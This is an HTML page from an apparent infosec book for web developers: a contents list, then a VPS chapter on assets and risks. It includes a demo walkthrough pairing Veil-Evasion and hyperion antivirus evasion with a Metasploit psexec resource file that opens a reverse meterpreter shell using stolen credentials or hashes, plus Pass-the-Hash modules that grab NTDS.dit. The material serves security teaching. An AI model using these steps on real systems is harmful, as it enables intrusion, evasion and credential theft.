            <a href='chap06.html#web-applications-countermeasures-lack-of-authentication-authorisation-session-management'>Lack of Authentication, Authorisation and Session Management</a>
            <ul>
              <li>
                <a href='chap06.html#leanpub-auto-chosen-technologies'>Chosen technologies:</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-technology-and-design-decisions'>Technology and Design Decisions</a>
                <ul>
                  <li>
                    <a href='chap06.html#leanpub-auto-reference-token-vs-json-web-token-jwt'>Reference Token vs JSON Web Token (JWT)</a>
                  </li>
                  <li>
                    <a href='chap06.html#leanpub-auto-identityserver3'>IdentityServer3</a>
                  </li>
                  <li>
                    <a href='chap06.html#web-applications-countermeasures-lack-of-authentication-authorisation-session-management-technology-and-design-decisions-membershipreboot'>MembershipReboot</a>
                  </li>
                  <li>
                    <a href='chap06.html#leanpub-auto-external-identity-providers'>External Identity Providers</a>
                  </li>
                </ul>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-architecture'>Architecture</a>
              </li>
              <li>
                <a href='chap06.html#web-applications-countermeasures-lack-of-authentication-authorisation-session-management-securing-sessions'>Securing Sessions</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap06.html#web-applications-countermeasures-cryptography-on-the-client'>Cryptography on the Client (AKA Untrusted Crypto)</a>
            <ul>
              <li>
                <a href='chap06.html#web-applications-countermeasures-cryptography-on-the-client-web-cryptography-api'>Web Cryptography API</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-user-agent'>user agent</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-handle'><code>[[handle]]</code></a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-cryptokey-web-api-interface'><code>CryptoKey</code> (Web API interface)</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-the-other-two-web-crypto-api-interfaces'>The other two Web Crypto API interfaces</a>
                <ul>
                  <li>
                    <a href='chap06.html#leanpub-auto-cryptohttpsdevelopermozillaorgen-usdocswebapicrypto-web-api-interface'>Crypto (Web API interface)</a>
                  </li>
                  <li>
                    <a href='chap06.html#leanpub-auto-subtlecryptohttpsdevelopermozillaorgen-usdocswebapisubtlecrypto-web-api-interface'>SubtleCrypto (Web API interface)</a>
                  </li>
                </ul>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-cloud-storage'>Cloud Storage</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-protected-data-and-document-exchange'>Protected Data and Document Exchange</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap06.html#web-applications-countermeasures-consuming-free-and-open-source'>Consuming Free and Open Source</a>
            <ul>
              <li>
                <a href='chap06.html#leanpub-auto-process'>Process</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-consumption-is-your-responsibility'>Consumption is Your Responsibility</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-keeping-safe'>Keeping Safe</a>
                <ul>
                  <li>
                    <a href='chap06.html#leanpub-auto-wget-curl-etc'>wget, curl, etc</a>
                  </li>
                  <li>
                    <a href='chap06.html#leanpub-auto-npm-install'>npm install</a>
                  </li>
                  <li>
                    <a href='chap06.html#web-applications-countermeasures-consuming-free-and-open-source-keeping-safe-doppelganger-packages'>Doppelganger Packages</a>
                  </li>
                  <li>
                    <a href='chap06.html#leanpub-auto-whitelisting-packageshttpsnpmenpmjscomdocsworkflowwhitelistinghtml-via-npm-enterprise'>Whitelisting Packages via npm Enterprise</a>
                  </li>
                </ul>
              </li>
              <li>
                <a href='chap06.html#web-applications-countermeasures-consuming-free-and-open-source-tooling'>Tooling</a>
                <ul>
                  <li>
                    <a href='chap06.html#leanpub-auto-npm-outdatedhttpsdocsnpmjscomclioutdated'>npm-outdated</a>
                  </li>
                  <li>
                    <a href='chap06.html#leanpub-auto-npm-checkhttpswwwnpmjscompackagenpm-check'>npm-check</a>
                  </li>
                  <li>
                    <a href='chap06.html#leanpub-auto-davidhttpsdavid-dmorg'>David</a>
                  </li>
                  <li>
                    <a href='chap06.html#leanpub-auto-retirejshttpsgithubcomretirejsretirejs'>RetireJS</a>
                  </li>
                  <li>
                    <a href='chap06.html#leanpub-auto-requiresafe'>requireSafe</a>
                  </li>
                  <li>
                    <a href='chap06.html#leanpub-auto-bithoundhttpswwwbithoundio'>bithound</a>
                  </li>
                  <li>
                    <a href='chap06.html#leanpub-auto-node-security-platformhttpsnodesecurityio-nsp'>Node Security Platform (NSP)</a>
                  </li>
                  <li>
                    <a href='chap06.html#leanpub-auto-snykhttpssnykio'>Snyk</a>
                  </li>
                </ul>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap06.html#web-applications-countermeasures-insufficient-attack-protection'>Insufficient Attack Protection</a>
            <ul>
              <li>
                <a href='chap06.html#web-applications-countermeasures-insufficient-attack-protection-waf'>Web Application Firewall (WAF)</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-application-intrusion-detection-and-response'>Application Intrusion Detection and Response</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-active-automated-prevention'>Active Automated Prevention</a>
              </li>
            </ul>
          </li>
        </ul>
      </li>
      <li>
        <a href='chap06.html#web-applications-risks-that-solution-causes'>4. SSM Risks that Solution Causes</a>
        <ul>
          <li>
            <a href='chap06.html#leanpub-auto-lack-of-visibility-7'>Lack of Visibility</a>
            <ul>
              <li>
                <a href='chap06.html#leanpub-auto-insufficient-logging-and-monitoring-1'>Insufficient Logging and Monitoring</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap06.html#leanpub-auto-lack-of-input-validation-filtering-and-sanitisation'>Lack of Input Validation, Filtering and Sanitisation</a>
            <ul>
              <li>
                <a href='chap06.html#leanpub-auto-cross-site-scripting-xss'>Cross-Site Scripting (XSS)</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap06.html#leanpub-auto-cross-site-request-forgery-csrf-1'>Cross-Site Request Forgery (CSRF)</a>
          </li>
          <li>
            <a href='chap06.html#leanpub-auto-injection-1'>Injection</a>
            <ul>
              <li>
                <a href='chap06.html#leanpub-auto-sqli'>SQLi</a>
              </li>
              <li>
                <a href='chap06.html#web-applications-risks-that-solution-causes-nosqli'>NoSQLi</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-command-injection'>Command Injection</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-xml-injection'>XML Injection</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-xslt-injection'>XSLT Injection</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-xpath-injection'>XPath Injection</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-xquery-injection'>XQuery Injection</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-ldap-injection'>LDAP Injection</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap06.html#leanpub-auto-captcha-1'>Captcha</a>
          </li>
          <li>
            <a href='chap06.html#leanpub-auto-management-of-application-secrets'>Management of Application Secrets</a>
            <ul>
              <li>
                <a href='chap06.html#leanpub-auto-store-configuration-in-configuration-files'>Store Configuration in Configuration files</a>
                <ul>
                  <li>
                    <a href='chap06.html#leanpub-auto-node-config-1'>node-config</a>
                  </li>
                  <li>
                    <a href='chap06.html#leanpub-auto-windows-3'>Windows:</a>
                  </li>
                  <li>
                    <a href='chap06.html#leanpub-auto-linux-1'>Linux:</a>
                  </li>
                </ul>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-least-privilege'>Least Privilege</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-location-1'>Location</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-data-store-compromise'>Data-store Compromise</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap06.html#web-applications-risks-that-solution-causes-lack-of-authentication-authorisation-and-session-management'>Lack of Authentication, Authorisation and Session Management</a>
          </li>
          <li>
            <a href='chap06.html#web-applications-risks-that-solution-causes-cryptography-on-the-client'>Cryptography on the Client (AKA Untrusted Crypto)</a>
          </li>
          <li>
            <a href='chap06.html#leanpub-auto-consuming-free-and-open-source'>Consuming Free and Open Source</a>
            <ul>
              <li>
                <a href='chap06.html#leanpub-auto-process-1'>Process</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-tooling'>Tooling</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap06.html#leanpub-auto-insufficient-attack-protection-1'>Insufficient Attack Protection</a>
          </li>
        </ul>
      </li>
      <li>
        <a href='chap06.html#web-applications-costs-and-trade-offs'>5. SSM Costs and Trade-offs</a>
        <ul>
          <li>
            <a href='chap06.html#leanpub-auto-lack-of-visibility-8'>Lack of Visibility</a>
            <ul>
              <li>
                <a href='chap06.html#leanpub-auto-insufficient-logging-and-monitoring-2'>Insufficient Logging and Monitoring</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap06.html#leanpub-auto-lack-of-input-validation-filtering-and-sanitisation-1'>Lack of Input Validation, Filtering and Sanitisation</a>
            <ul>
              <li>
                <a href='chap06.html#leanpub-auto-cross-site-scripting-xss-1'>Cross-Site Scripting (XSS)</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap06.html#leanpub-auto-cross-site-request-forgery-csrf-2'>Cross-Site Request Forgery (CSRF)</a>
          </li>
          <li>
            <a href='chap06.html#leanpub-auto-injection-2'>Injection</a>
            <ul>
              <li>
                <a href='chap06.html#leanpub-auto-sqli-1'>SQLi</a>
              </li>
              <li>
                <a href='chap06.html#web-applications-costs-and-trade-offs-nosqli'>NoSQLi</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-command-injection-1'>Command Injection</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-xml-injection-1'>XML Injection</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-xslt-injection-1'>XSLT Injection</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-xpath-injection-1'>XPath Injection</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-xquery-injection-1'>XQuery Injection</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-ldap-injection-1'>LDAP Injection</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap06.html#leanpub-auto-captcha-2'>Captcha</a>
          </li>
          <li>
            <a href='chap06.html#leanpub-auto-management-of-application-secrets-1'>Management of Application Secrets</a>
            <ul>
              <li>
                <a href='chap06.html#leanpub-auto-store-configuration-in-configuration-files-1'>Store Configuration in Configuration files</a>
                <ul>
                  <li>
                    <a href='chap06.html#leanpub-auto-windows-4'>Windows:</a>
                  </li>
                  <li>
                    <a href='chap06.html#leanpub-auto-linux-2'>Linux</a>
                  </li>
                </ul>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-least-privilege-1'>Least Privilege</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-location-2'>Location</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-data-store-compromise-1'>Data-store Compromise</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap06.html#leanpub-auto-lack-of-authentication-authorisation-and-session-management'>Lack of Authentication, Authorisation and Session Management</a>
          </li>
          <li>
            <a href='chap06.html#web-applications-costs-and-trade-offs-cryptography-on-the-client'>Cryptography on the Client (AKA Untrusted Crypto)</a>
          </li>
          <li>
            <a href='chap06.html#leanpub-auto-consuming-free-and-open-source-1'>Consuming Free and Open Source</a>
          </li>
          <li>
            <a href='chap06.html#leanpub-auto-insufficient-attack-protection-2'>Insufficient Attack Protection</a>
          </li>
        </ul>
      </li>
    </ul>
  </li>
  <li>
    <a href='chap07.html#additional-resources'>Additional Resources</a>
    <ul>
      <li>
        <a href='chap07.html#leanpub-auto-vpsvps'>VPS</a>
      </li>
      <li>
        <a href='chap07.html#leanpub-auto-networknetwork'>Network</a>
      </li>
      <li>
        <a href='chap07.html#leanpub-auto-cloudcloud'>Cloud</a>
      </li>
      <li>
        <a href='chap07.html#leanpub-auto-web-applicationsweb-applications'>Web Applications</a>
      </li>
    </ul>
  </li>
  <li>
    <a href='chap08.html#leanpub-auto-attributions'>Attributions</a>
    <ul>
      <li>
        <a href='chap08.html#leanpub-auto-introduction-1'>Introduction</a>
      </li>
      <li>
        <a href='chap08.html#leanpub-auto-vpsvps-1'>VPS</a>
      </li>
      <li>
        <a href='chap08.html#leanpub-auto-networknetwork-1'>Network</a>
      </li>
      <li>
        <a href='chap08.html#leanpub-auto-cloudcloud-1'>Cloud</a>
      </li>
      <li>
        <a href='chap08.html#leanpub-auto-web-applicationsweb-applications-1'>Web Applications</a>
      </li>
    </ul>
  </li>
</ul>

</ol>
</div>
<div id="leanpub-main" class="kramdown">
<h2 id="vps">7. VPS</h2>


<figure class="image center" style="width: 396px;">
  <img src="images/10000VPS.png" alt="10,000' view of VPS Security" style="width: 100%;" />
  <figcaption>10,000 view of VPS Security</figcaption>
</figure>


<p>If you have the necessary resources, that is knowledge, skill, experience, desire, money, and of course the need for high security which is becomming more and more important all the time, I usually advocate bringing VPS(s) <a href="http://blog.binarymist.net/2014/11/29/journey-to-self-hosting/">in-house</a> where you have more control. Most of my work around VPSs are with GNU/Linux instances. Most of the testing in this chapter was performed on Debian instances, usually, but not allways, web servers. Unless stated otherwise, the following applies to these type of instances.</p>

<h3 id="vps-asset-identification">1. SSM Asset Identification</h3>
<p>Take results from higher level Asset Identification found in the 30,000 View chapter of <a href="https://leanpub.com/holistic-infosec-for-web-developers">Fascicle 0</a>. Remove any that are not applicable. Add any newly discovered. Here are some to get you started:</p>

<ul>
  <li>Ownership. At first this may sound strange, but that is because of an assumption you may have that it is a given that you will always own, or at least have control of your server(s). I am going to dispel this myth. When an attacker wants to compromise your server(s), they want to do so for a reason. Possibly it is just for kicks, possibly it is for some more sinister reason. They want an asset that presumably belongs to you, your organisation, or your customers. If they can take control of your server(s) (own it/steal it/what ever you want to call the act), then they have a foot hold to launch further attacks and gain other assets that do not belong to them. With this in mind, you could think of your server(s) as an asset. On the other hand you could think of your it as a liability. Both may be correct. In any case, you need to protect your server(s) and in many cases take it to school and teach it how to protect itself. This is covered under the <a href="chap03.html#vps-countermeasures">SSM Countermeasures</a> section with items such as HIDS and Logging and Alerting.</li>
  <li>Visibility into and of many things, such as:
    <ul>
      <li>Disk space</li>
      <li>Disk IO</li>
      <li>CPU usage</li>
      <li>Memory usage</li>
      <li>File integrity and time stamp changes</li>
      <li>Which system processes are running</li>
      <li>System process health and responsiveness</li>
      <li>Current login sessions, and failed attempts</li>
      <li>What any user is doing on the system currently</li>
      <li>Network connections</li>
      <li>Etc</li>
    </ul>
  </li>
  <li>Taking the confidential business and client information from the Starting with the 30,000 view chapter, here we can concretise these concepts into forms such as:
    <ul>
      <li>Email, Web, Data-store servers and of course the data on them.</li>
      <li>You could even stretch this to individuals PCs and other devices which may be carrying this sort of confidential information on them. Mobile devices are a huge risk for example (covered in the Mobile chapter of <a href="https://leanpub.com/holistic-infosec-for-web-developers-fascicle2-mobile-iot">Fascicle 2</a>)</li>
    </ul>
  </li>
</ul>

<p>This is probably an incomplete list for your domain. I have given you a start. Put your thinking cap on and populate the rest, or come back to it as additional assets enter your mind.</p>

<h3 id="leanpub-auto-ssm-identify-risks">2. SSM Identify Risks</h3>
<p>Go through same process as we did at the top level in <a href="https://leanpub.com/holistic-infosec-for-web-developers">Fascicle 0</a>, but for your VPS(s).</p>

<ul>
  <li><a href="https://msdn.microsoft.com/en-us/library/ff648641.aspx#c02618429_007">MS Host Threats and Countermeasures</a></li>
  <li>
<a href="https://msdn.microsoft.com/en-us/library/ff648653.aspx">MS Securing Your Web Server</a> This is Windows specific, but does offer some insight into technology agnostic risks and countermeasures.</li>
  <li>
<a href="https://msdn.microsoft.com/en-us/library/ff648657.aspx">MS Securing Your Application Server</a> As above, Microsoft specific, but does provide some ideas for vendor agnostic concepts</li>
</ul>

<h4 id="vps-identify-risks-forfeit-control-thus-security">Forfeit Control thus Security</h4>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----average-widespread-average-severe.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>In terms of security, unless your provider is <a href="http://www.computerweekly.com/news/2240187513/Is-Switzerland-turning-into-a-cloud-haven-in-the-wake-of-Prism-scandal">Swiss</a>, you give up so much when you forfeit your system(s) to an external provider. I cover this in my talk <a href="http://blog.binarymist.net/presentations-publications/#does-your-cloud-solution-look-like-a-mushroom">Does Your Cloud Solution Look Like a Mushroom</a>.</p>

<ul>
  <li>If you do not own your VPS(s), you will have very limited security, visibility and control over the infrastructure.</li>
  <li>Limited (at best) visibility into any hardening process your CSP takes. Essentially you Get what you are given.</li>
  <li>Cloud and hosting providers are in many cases forced by governments and other agencies to give up your secrets. It is very common place now and you may not even know that it has happened. Swiss providers may be the exception here.</li>
  <li>What control do you have that if you are data in the cloud has been compromised you actually know about it and can invoke your incident response team(s) and procedures?</li>
  <li>Cloud and hosting providers are readily giving up your secrets to government organisations and the highest bidders. In many cases you will not know about it.</li>
  <li>Your provider may go out of business and you may get little notice of this.</li>
  <li>Providers are outsourcing their outsourced services to several providers deep. They do not even have visibility themselves. Control is lost.</li>
  <li>&gt; distribution = &gt; attack surface. Where is your data? Where are your VM images running from? Further distributed on iSCSI targets? Where are the targets?</li>
  <li>Your provider knows little (at best) about your domain, how you operate, or what you have running on their system(s). How are they supposed to protect you if they have no knowledge of your domain?</li>
</ul>

<h4 id="vps-identify-risks-Windows">Windows</h4>

<p>Windows exploitation is prevalent, easy and fun, because there is what seems to be a never ending source of security defects. I am not going to attempt to cover much, as I would be here for to long, and this book series is more focussed on giving you a broad understanding with examples as we go.</p>

<p>The problem is not so much that there is a never ending source of defects in Windows, but rather, that the platform was not designed with openness as a core attribute. Because of its closed nature, hardening the platform in many cases is very difficult and often comes down to applying band-aids over top of the defects rather than being able to remove them.</p>

<p>If you want a platform that you can have a decent level of control over its security, do not buy into closed offerings.</p>

<h5 id="vps-identify-risks-psexec">PsExec</h5>

<figure class="image center" style="width: 395px;">
  <img src="images/ThreatTags----average-common-difficult-severe.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>PsExec was written by Mark Russinovich as part of the Sysinternals tool suite. PsExec the tool allows you to execute programs on remote Windows systems without having to install anything on the server you want to manage or hack. Also being a <a href="https://technet.microsoft.com/en-us/sysinternals/bb897553.aspx">Telnet replacement</a>.<br />
PsExec <a href="https://community.rapid7.com/community/metasploit/blog/2013/03/09/psexec-demystified">requires</a> a few things on the target system:</p>

<ol class="numeric">
  <li>The Server Message Block (SMB) service must be available and reachable (not blocked by a fire wall for example)</li>
  <li>File and Print Sharing must be enabled</li>
  <li>Simple File Sharing must be disabled</li>
  <li>The Admin$ share (which maps to the Windows directory) must be available and accessible, test it first</li>
  <li>The credentials supplied to the PsExec utility must have permissions to access the Admin$ share</li>
</ol>

<p>There are several <a href="https://community.rapid7.com/community/metasploit/blog/2013/03/09/psexec-demystified">behavioural techniques</a>, or <a href="https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/smb/psexec.md#scenarios">targets</a> as Metasploit calls them for the <code>psexec</code> module. In this case we use the Native Upload Target, but using a custom compiled payload (<code>set exe::custom</code>), you can see this in The Play below. What happens here is that our payload is embedded into a Windows Service executable within the PsExec executable, which it then deploys to the Admin$ share on the target machine. The DCE/RPC interface is then used over SMB to access the Windows Service Control Manager (SCM) API. PsExec then turns on its Windows Service on the target machine. This service then creates a named pipe which can be used to send commands to the system.</p>

<p>The Metasploit <a href="https://www.rapid7.com/db/modules/exploit/windows/smb/psexec"><code>psxec</code> module</a> (<code>exploit/windows/smb/psexec</code>) uses basically the same principle. This was the first of the Pass The Hash suite of Metasploit modules, <a href="https://github.com/rapid7/metasploit-framework/commits/master/modules/exploits/windows/smb/psexec.rb?after=Y3Vyc29yOk6%2FV6xQayGnXiF%2FSfDmc6XJLm5lKzEwNA%3D%3D">first committed</a> on 2007-07-03</p>


<figure id="wdcnz-demo-5" class="image center" style="width: 396px;">
  <img src="images/HandsOnHack.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>The following attack was the last of five that I demonstrated at WDCNZ in 2015. The <a href="chap04.html#wdcnz-demo-4">previous demo</a> of that series will provide some additional context and it is probably best to look at it first if you have not already.</p>

<p>You can find the video of how it is played out at <a href="http://youtu.be/1EvwwYiMrV4">http://youtu.be/1EvwwYiMrV4</a>.</p>

<aside class="information blurb">
    <h3 id="leanpub-auto-synopsis">Synopsis</h3>

  <p>This demo differs from the previous in that we do not rely on any of the targets direct interaction. There is no longer a need for the browser.<br />
We open a reverse shell from the victim to us using Metasploit.<br />
We use Veil-Evasion with the help of hyperion to encrypt our payload to evade AV.<br />
With this attack you will have had to have obtained the targets username and password or <a href="https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/">password hash</a>.<br />
We leverage PsExec which expects your binary to be a windows service.
You can also leverage ARP and DNS spoofing with Ettercap from the previous attack. I have not included these steps in this play though, although the video assumes they have been included.</p>

</aside>

<aside class="generic_inbar blurb bomb icon-bomb">
    <h3 id="leanpub-auto-the-play">The Play</h3>

  <p>Start Veil-Evasion:<br />
<code>cd /opt/Veil/Veil-Evasion/ &amp;&amp; ./Veil-Evasion.py</code></p>

  <p>List the available payloads to encrypt:<br />
<code>list</code></p>

  <p>Choose a service because we are going to use <code>psexec</code> to install it on the targets box and we want to open a reverse shell:<br />
<code>use 4</code><br />
That is <code>c/meterpreter/rev_http_service</code></p>

  <p>Set any options here:<br />
<code>set lhost &lt;IP address that we are going to be listening on for the reverse shell&gt;</code>  </p>

  <p>Generate the initial payload:<br />
<code>generate</code></p>

  <p>Give it a name. I just selected the default of payload.<br />
[Enter]<br />
Exit out of Veil-Evasion.</p>

  <p><code>/usr/share/veil-output/compiled/payload[n].exe</code> needs to be encrypted with hyperion, either on a Windows box or Linux with Wine.<br />
hyperion encrypts with a weak 128-bit AES key, which decrypts itself by brute force at the time of execution. The command to run is:<br />
<code>hyperion.exe -v payload.exe encrypted-payload.exe</code><br />
We then put the encrypted payload somewhere where Metasploit can access it:<br />
I just copied it back to <code>/usr/share/veil-output/compiled/encrypted-payload.exe</code><br />
We then tell Metasploit where we have put it.<br />
I created a Metasploit resource file:<br />
<code>cat ~/demo.rc</code></p>

  <p><code>use exploit/windows/smb/psexec</code><br />
<code>set payload windows/meterpreter/reverse_http</code><br />
<code>set lport 8080</code><br />
<code>set lhost &lt;IP address that we are going to be listening on for the reverse shell&gt;</code><br />
<code>set rhost &lt;IP address of target&gt;</code><br />
<code>set exe::custom /usr/share/veil-output/compiled/encrypted-payload.exe</code><br />
<code>set smbuser &lt;target username&gt;</code><br />
<code>set</code> <a href="https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/smb/psexec.md#options"><code>smbpass</code></a> &lt;target password or hash&gt;<br />
<code>run</code></p>

  <p>The IP addresses and ports need to be the same as you specified in the creating of the payload using Veil-Evasion.</p>

</aside>

<aside class="generic_inbar blurb bomb icon-bomb">
    <p>Now we have got the credentials from a previous exploit. There are many techniques and tools to help capture these, whether you have physical access or not. We just need the username &amp; password or hash which is transmitted across the network for all to see. Also easily obtainable if you have physical access to the machine.</p>

  <p>We now run msfconsole with the resource file as parameter:<br />
<code>msfconsole -r ~/demo.rc</code><br />
and that is enough to evade AV and get our reverse shell.</p>

  <p><code>sessions</code> will show you the active sessions you have.<br />
To interact with the first one:<br />
<code>sessions -i 1</code></p>

  <p>From here on in, the <a href="https://www.youtube.com/watch?v=1EvwwYiMrV4">video</a> demonstrates creating a new file beside the targets hosts file, thus demonstrating full system privileges.</p>

</aside>

<p>Just before the Synopsis, I mentioned that there were several behavioural techniques for the <code>psexec</code> module. One of the other techniques, called MOF Upload Target is to use Managed Object Format (MOF) files which use the C++ syntax. These MOF files must be compiled and are then consumed by Windows Management Instrumentation (WMI). This works quite differently, <code>psexec</code> does not execute anything, all it does is upload your executable to <code>SYSTEM32</code>, and a MOF file to <code>SYSTEM32\wbem\mof\</code>. When windows receives the event for the new MOF file, it compiles and executes it, which tells Windows to run the paylod in <code>SYSTSEM32</code>. Metasploits MOF library only works with Windows XP and Server 2003. There is also the same high chance of getting sprung by AV, although you can carry out similar tricks as we did above to get around the AV signatures.</p>

<p>If you are running a penetration test for a client and your targets AV fires, then it could be game over for you. There are better options that exist now that are less likely to ring alarm bells with your target.</p>

<h5 id="vps-identify-risks-windows-pth-suite-of-metasploit-modules">Pass The Hash (PTH) suite of Metasploit Modules</h5>

<figure class="image center" style="width: 395px;">
  <img src="images/ThreatTags----average-common-difficult-severe.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>We have just detailed and demonstrated the first of the Metasploit PTH suite above. Kali Linux also has the <a href="https://www.kali.org/tutorials/pass-the-hash-toolkit-winexe-updates/">Pass the Hash toolkit</a> (with all tools prefixed with pth-). The following are the rest of the Metasploit PTH modules in order of when they were introduced. All of the PTH suite except <code>psexec_ntdsgrab</code> depend on <a href="https://www.cvedetails.com/cve/cve-1999-0504">CVE-1999-0504</a>. They also all make use of the PsExec utility except the last one <code>wmi</code>. You will notice that some of these are exploits and some are technically auxiliary modules, as you read their descriptions, you will understand why.</p>

<ol class="numeric">
  <li>
<a href="https://www.rapid7.com/db/modules/exploit/windows/local/current_user_psexec"><code>current_user_psexec</code></a><br />
(2012-08-01) <code>exploit/windows/local/current_user_psexec</code><br />
PsExec via Current User Token  
    <ol class="numeric">
      <li>This module uploads an executable file to the victim system, then creates a share containing that executable</li>
      <li>Then creates a remote service on each target system similar to the <code>psexec</code> module, using a UNC path to the file on the victim system, this is essentially a pivot, or lateral movement</li>
      <li>Then starts the service(s) on the target hosts which run the executable from step 1. The reason the service(s) on the target(s) can be placed and run, is because we are using the victims legitimate current sessions authentication token to pivot to the target(s), we do not need to know the credentials for the target(s)  </li>
    </ol>

    <p>You are going to want to run ss to find out which system(s) if any, the administrator is connected to, ideally something important like a Domain Controller. From the victim, you can compromise many targets using the same administrators authentication token.  </p>

    <p>This is a local exploit, it has to be run from an already compromised administrator that you have a Meterpreter session on, a reverse shell for example, against your target, this is where the pivot occurs  </p>
  </li>
  <li>
<a href="https://www.rapid7.com/db/modules/auxiliary/admin/smb/psexec_command"><code>psexec_command</code></a><br />
(2012-11-23) <code>auxiliary/admin/smb/psexec_command</code><br />
Microsoft Windows Authenticated Administration Utility  
    <p>This module passes the valid administrator credentials, then executes a single arbitrary Windows command on one or more target systems, using a similar technique to the PsExec utility provided by SysInternals. This will not trigger AV as no binaries are uploaded, we are simply leveraging cmd.exe. but it also does not provide a meterpreter shell. Concatenating commands with &amp; does not work  </p>
  </li>
  <li>
<a href="https://www.rapid7.com/db/modules/auxiliary/scanner/smb/psexec_loggedin_users"><code>psexec_loggedin_users</code></a><br />
(2012-12-05) <code>auxiliary/scanner/smb/psexec_loggedin_users</code><br />
Microsoft Windows Authenticated Logged In Users Enumeration  
    <p>This module passes the valid administrator credentials, then using a similar technique to that of the PsExec utility queries the HKU base registry key on the remote machine with reg.exe to get the list of currently logged in users. Notice this is a scanner module, so it can be run against many target machines concurrently  </p>
  </li>
  <li>
<a href="https://www.rapid7.com/db/modules/exploit/windows/smb/psexec_psh"><code>psexec_psh</code></a><br />
(2013-1-21) <code>exploit/windows/smb/psexec_psh</code><br />
Microsoft Windows Authenticated Powershell Command Execution  
    <p>This module passes the valid administrator credentials as usual, then attempts to execute a powershell payload using a similar technique to the PsExec utility. This method is far less likely to be detected by AV because: PowerShell is native to Windows, each payload is unique because it is your script and it is just base64 encoded, more likely to escape signature based detection, it also never gets written to disk. It is executed from the commandline using the <code>-encodedcommand </code> flag and provides the familiar Meterpreter shell  </p>

    <ul>
      <li><em>A persist option is also provided to execute the payload in a while loop in order to maintain a form of persistence.</em></li>
      <li><em>In the event of a sandbox observing PowerShell execution, a delay and other obfuscation may be added to avoid detection.</em></li>
      <li><em>In order to avoid interactive process notifications for the current user, the PowerShell payload has been reduced in size and wrapped in a PowerShell invocation which hides the window entirely.</em>  </li>
    </ul>
  </li>
  <li>
<a href="https://www.rapid7.com/db/modules/auxiliary/admin/smb/psexec_ntdsgrab"><code>psexec_ntdsgrab</code></a><br />
(2013-03-15) <code>auxiliary/admin/smb/psexec_ntdsgrab</code><br />
PsExec <code>NTDS.dit</code> And SYSTEM Hive Download Utility  
    <p>Similar to SmbExec that we setup in the Tooling Setup chapter of Fascicle 0, this Metasploit module authenticates to an Active Directory Domain Controller and creates a volume shadow copy of the %SYSTEMDRIVE% using a native Windows tool vssadmin (visible in the <a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/admin/smb/psexec_ntdsgrab.rb#L55">source</a>). It then pulls down copies of the <code>NTDS.dit</code> file as well as the SYSTEM registry hive and stores them. The <code>NTDS.dit</code> and SYSTEM registry hive copy can be used in combination with other tools for offline extraction of AD password hashes. All of this is done without uploading a single binary to the target host.  </p>

    <p>There are additional details around where <code>NTDS.dit</code> fits into the picture in the <a href="chap06.html#web-applications-countermeasures-management-of-application-secrets-store-configuration-windows">Windows section</a> of the Web Applications chapter.  </p>

    <p>Unlike SmbExec, we have to parse the files that <code>psexec_ntdsgrab</code> downloads for us with a separate tool, also discussed briefly in the <a href="chap06.html#web-applications-countermeasures-management-of-application-secrets-store-configuration-windows">Windows section</a> of the Web Applications chapter  </p>
  </li>
  <li>
<a href="https://www.rapid7.com/db/modules/exploit/windows/local/wmi"><code>wmi</code></a><br />
(2013-09-21) <code>exploit/windows/local/wmi</code><br />
Windows Management Instrumentation (WMI) Remote Command Execution  
    <p>Before we cover the Metasploit module, lets gain a little more understanding around what WMI is, when it was introduced, how wide spread its consumption is, etc.  </p>

    <p>Windows NT 4.0 (1996-07-29): During this time period, Microsoft released an out-of-band WMI implementation that could be downloaded and installed. Since then Microsoft has consistently added WMI providers.  </p>

